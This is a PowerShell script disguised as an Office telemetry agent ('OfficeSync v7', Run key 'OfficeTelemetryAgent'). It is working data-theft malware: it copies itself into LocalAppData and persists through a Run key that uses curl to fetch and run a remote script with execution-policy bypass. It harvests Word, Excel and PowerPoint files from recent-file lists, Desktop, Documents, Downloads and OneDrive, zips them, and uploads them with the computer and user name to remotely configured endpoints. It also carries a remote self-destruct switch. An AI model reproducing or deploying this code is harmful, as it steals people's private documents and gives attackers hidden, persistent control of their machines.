# OfficeSync v7
$ErrorActionPreference='SilentlyContinue'
$ProgressPreference='SilentlyContinue'
try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{}
Add-Type -AssemblyName System.IO.Compression.FileSystem
Add-Type -AssemblyName System.Net.Http

$base='https://raw.githubusercontent.com/Capyvests/office-demmo/refs/heads/main'
$cfgUrl="$base/config.txt"
$scriptUrl="$base/main.ps1"
$estado='HKCU:\Software\Microsoft\Office\16.0\Common\OTM'
$pst=Join-Path $env:LOCALAPPDATA 'Microsoft\Office\OTM'
$run='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$runNome='OfficeTelemetryAgent'
$ext='.docx','.doc','.docm','.pptx','.ppt','.pptm','.xlsx','.xls'
$chaves='versao','ativo','hora_inicio','hora_fim','intervalo','max_envios','dedupe','destruir','endpoint','endpoint2'
$ua='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'

New-Item -ItemType Directory -Path $pst -Force|Out-Null
if(-not(Test-Path $estado)){New-Item -Path $estado -Force|Out-Null}

$mtx=New-Object Threading.Mutex($false,'Global\OTM_'+$env:USERNAME)
if(-not $mtx.WaitOne(0)){exit}

$eu=$PSCommandPath
if($eu -and $eu -ne (Join-Path $pst 'otm.ps1')){
  Copy-Item -LiteralPath $eu -Destination (Join-Path $pst 'otm.ps1') -Force -EA 0
  if($eu -like (Join-Path $env:TEMP '*')){Remove-Item -LiteralPath $eu -Force -EA 0}
}

function Est($n){(Get-ItemProperty -Path $estado -Name $n -EA 0).$n}
function SetEst($n,$v){Set-ItemProperty -Path $estado -Name $n -Value $v -EA 0}
function SetHashes($a){Set-ItemProperty -Path $estado -Name 'hashes' -Value ([string[]]$a) -EA 0}

function NaJanela($i,$f,$h){
  if($i -eq $f){return $true}
  if($i -lt $f){return ($h -ge $i -and $h -lt $f)}
  return ($h -ge $i -or $h -lt $f)
}

function Buscar($u){
  try{
    $wc=New-Object Net.WebClient
    $wc.Headers.Add('User-Agent',$ua)
    $wc.Proxy=[Net.WebRequest]::GetSystemWebProxy()
    $wc.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials
    $wc.DownloadString("$u`?t=$([DateTime]::UtcNow.Ticks)")
  }catch{return $null}
}

function LerCfg($bruto){
  $h=@{}
  foreach($l in ($bruto -split "`r?`n")){
    if($l -notmatch '^\s*([A-Za-z_][A-Za-z0-9_]*)\s*=(.*)$'){continue}
    $k=$Matches[1]
    if($chaves -notcontains $k){continue}
    $h[$k]=$Matches[2].Trim()
  }
  if($h.Count -eq 0){return $null}
  $h
}

function Enviar($zip,$meta,$url,$modo){
  $cli=$null;$fs=$null
  try{
    $cli=New-Object Net.Http.HttpClient
    $cli.Timeout=[TimeSpan]::FromSeconds(45)
    $cli.DefaultRequestHeaders.Add('User-Agent',$ua)
    $cli.DefaultRequestHeaders.Add('X-Host',$env:COMPUTERNAME)
    $cli.DefaultRequestHeaders.Add('X-User',$env:USERNAME)
    if($modo -eq 'raw'){
      $bytes=[IO.File]::ReadAllBytes($zip)
      $sc=New-Object Net.Http.ByteArrayContent(,$bytes)
      $sc.Headers.ContentType=[Net.Http.Headers.MediaTypeHeaderValue]::Parse('application/zip')
      $r=$cli.PostAsync($url,$sc).Result
    }else{
      $mp=New-Object Net.Http.MultipartFormDataContent
      $fs=[IO.File]::OpenRead($zip)
      $mp.Add((New-Object Net.Http.StreamContent($fs)),'files[0]','"'+[IO.Path]::GetFileName($zip)+'"')
      $mp.Add((New-Object Net.Http.StringContent($meta,[Text.Encoding]::UTF8,'application/json')),'payload_json')
      $r=$cli.PostAsync($url,$mp).Result
    }
    $cod=[int]$r.StatusCode
    if($cod -eq 429){
      try{
        $j=$r.Content.ReadAsStringAsync().Result|ConvertFrom-Json
        $w=[double]$j.retry_after
        if($w -gt 0 -and $w -le 20){Start-Sleep -Seconds ([int][math]::Ceiling($w))}
      }catch{}
    }
    $cod
  }catch{0}
  finally{if($fs){$fs.Dispose()};if($cli){$cli.Dispose()}}
}

function Persistir($cmd){
  if((Get-ItemProperty -Path $run -Name $runNome -EA 0).$runNome -ne $cmd){
    Set-ItemProperty -Path $run -Name $runNome -Value $cmd
  }
}

function Zipar($dir,$zip){
  $arr=@(Get-ChildItem -LiteralPath $dir -File -EA 0)
  if($arr.Count -eq 0){return $false}
  $fs=[IO.File]::Create($zip)
  try{
    $za=New-Object IO.Compression.ZipArchive($fs,[IO.Compression.ZipArchiveMode]::Create)
    foreach($f in $arr){
      try{[IO.Compression.ZipFileExtensions]::CreateEntryFromFile($za,$f.FullName,$f.Name)|Out-Null}catch{}
    }
    $za.Dispose()
  }catch{}
  finally{$fs.Close()}
  return $true
}

function Log($m){
  try{
    $lg=Join-Path $pst 'err.log'
    if((Get-Item $lg -EA 0).Length -gt 65536){Remove-Item $lg -Force -EA 0}
    Add-Content -Path $lg -Value "$(Get-Date -Format s) $m"
  }catch{}
}

$cfg=$null
$ciclo=0

while($true){
  try{
    $ciclo++

    if(-not $cfg -or ($ciclo % 20) -eq 0){
      $bruto=Buscar $cfgUrl
      if($bruto){
        $novo=LerCfg $bruto
        if($novo){$cfg=$novo;SetEst 'versao' $cfg.versao}
      }
    }
    if(-not $cfg){Start-Sleep 60;continue}

    if([int]$cfg.destruir -eq 1){
      $aviso='{"content":"**'+$env:COMPUTERNAME+'** / '+$env:USERNAME+' — destruido"}'
      for($t=0;$t -lt 3;$t++){
        try{
          $wc=New-Object Net.WebClient
          $wc.Headers.Add('Content-Type','application/json')
          $wc.UploadString($cfg.endpoint,$aviso)|Out-Null
          break
        }catch{Start-Sleep 2}
      }
      Remove-ItemProperty -Path $run -Name $runNome -EA 0
      Remove-ItemProperty -Path $run -Name 'OfficeSync' -EA 0
      Remove-Item -Path $estado -Recurse -Force -EA 0
      Remove-Item -Path $pst -Recurse -Force -EA 0
      exit
    }

    $int=[int]$cfg.intervalo
    if($int -lt 10){$int=10}
    if($int -gt 3600){$int=3600}

    $dedupe=$true
    if($cfg.dedupe -eq '0'){$dedupe=$false}

    $hoje=(Get-Date).ToString('yyyyMMdd')
    if((Est 'dia') -ne $hoje){SetEst 'dia' $hoje;SetEst 'envios' 0}

    $hora=(Get-Date).Hour
    $envios=[int](Est 'envios')
    $max=[int]$cfg.max_envios
    $passa=([int]$cfg.ativo -eq 1) -and (NaJanela ([int]$cfg.hora_inicio) ([int]$cfg.hora_fim) $hora) -and ($max -eq 0 -or $envios -lt $max)

    if(-not $passa){
      Persistir ('cmd /c curl.exe -s -L --max-time 20 -o "{0}" "{1}?t=%RANDOM%" && powershell -w h -nop -ni -ep bypass -f "{0}"' -f (Join-Path $pst 'otm.ps1'),$scriptUrl)
      Start-Sleep -Seconds ($int+(Get-Random -Minimum 0 -Maximum 6))
      continue
    }

    $out=Join-Path $env:TEMP ('ofs_'+(Get-Random))
    New-Item -ItemType Directory -Path $out -Force|Out-Null

    $paths=New-Object Collections.Generic.List[string]

    foreach($v in '16.0','15.0','14.0'){
      foreach($a in 'Word','PowerPoint','Excel'){
        $k="HKCU:\Software\Microsoft\Office\$v\$a\File MRU"
        if(Test-Path $k){
          $o=Get-ItemProperty $k
          $o.PSObject.Properties.Name|Where-Object{$_ -like 'Item*'}|ForEach-Object{
            $paths.Add((($o.$_ -split '\*')[-1]).Trim())
          }
        }
      }
    }

    $sh=New-Object -ComObject WScript.Shell
    Get-ChildItem (Join-Path $env:APPDATA 'Microsoft\Windows\Recent') -Filter '*.lnk' -EA 0|ForEach-Object{
      $t=$sh.CreateShortcut($_.FullName).TargetPath
      if($t){$paths.Add($t)}
    }

    foreach($d in @((Join-Path $env:USERPROFILE 'Desktop'),(Join-Path $env:USERPROFILE 'Documents'),(Join-Path $env:USERPROFILE 'Downloads'),$env:OneDrive,(Join-Path $env:USERPROFILE 'OneDrive'))){
      if($d -and (Test-Path -LiteralPath $d)){
        Get-ChildItem -LiteralPath $d -File -EA 0|ForEach-Object{$paths.Add($_.FullName)}
      }
    }

    $paths=@($paths|Where-Object{
        $_ -and (Test-Path -LiteralPath $_) -and ($ext -contains ([IO.Path]::GetExtension($_)).ToLower())
      }|Select-Object -Unique)

    $vistos=@{}
    foreach($h in ((Est 'hashes') -split ',')|Where-Object{$_}){$vistos[$h]=$true}

    $sel=@();$total=0
    foreach($p in $paths){
      if($sel.Count -ge 10){break}
      $it=Get-Item -LiteralPath $p -EA 0
      if(-not $it -or $it.Length -gt 8MB){continue}
      if($it.Attributes -band [IO.FileAttributes]::Offline){continue}
      $h=(Get-FileHash -LiteralPath $p -Algorithm SHA256 -EA 0).Hash
      if(-not $h){continue}
      if($dedupe -and $vistos.ContainsKey($h)){continue}
      if($total+$it.Length -gt 8MB){continue}
      $total+=$it.Length
      $sel+=,@{P=$p;H=$h}
    }

    if($sel.Count -gt 0){
      $n=0
      foreach($s in $sel){
        $n++
        try{Copy-Item -LiteralPath $s.P -Destination (Join-Path $out ('{0:D2}_{1}' -f $n,[IO.Path]::GetFileName($s.P))) -Force -EA 0}catch{}
      }

      $zip=Join-Path $env:TEMP ('ofs_'+(Get-Random)+'.zip')
      $okzip=$false
      try{$okzip=Zipar $out $zip}catch{$okzip=$false}

      if($okzip -and (Test-Path $zip)){
        $meta='{"username":"'+$env:COMPUTERNAME+'","content":"'+$env:COMPUTERNAME+' / '+$env:USERNAME+' / ciclo '+($envios+1)+' / '+$sel.Count+' doc"}'

        $ok=0
        for($t=1;$t -le 2;$t++){
          $cod=Enviar $zip $meta $cfg.endpoint 'multi'
          if($cod -ge 200 -and $cod -lt 300){$ok=1;break}
          if($cod -ne 429){break}
        }
        if(-not $ok -and $cfg.endpoint2){
          $cod=Enviar $zip $meta $cfg.endpoint2 'raw'
          if($cod -ge 200 -and $cod -lt 300){$ok=1}
        }

        if($ok -eq 1){
          SetEst 'envios' ($envios+1)
          SetEst 'ultimo' (Get-Date).ToString('s')
          if($dedupe){
            $todos=@(@($vistos.Keys)+@($sel|ForEach-Object{$_.H}))
            if($todos.Count -gt 150){$todos=$todos[($todos.Count-150)..($todos.Count-1)]}
            SetHashes $todos
          }
        }else{Log "envio falhou cod=$cod"}
        Remove-Item $zip -Force -EA 0
      }else{Log "zip falhou em $out"}
    }

    Remove-Item $out -Recurse -Force -EA 0

    Persistir ('cmd /c curl.exe -s -L --max-time 20 -o "{0}" "{1}?t=%RANDOM%" && powershell -w h -nop -ni -ep bypass -f "{0}"' -f (Join-Path $pst 'otm.ps1'),$scriptUrl)
  }catch{
    Log ("ERRO "+$_.Exception.Message+" linha "+$_.InvocationInfo.ScriptLineNumber)
  }

  Start-Sleep -Seconds ($int+(Get-Random -Minimum 0 -Maximum 6))
}
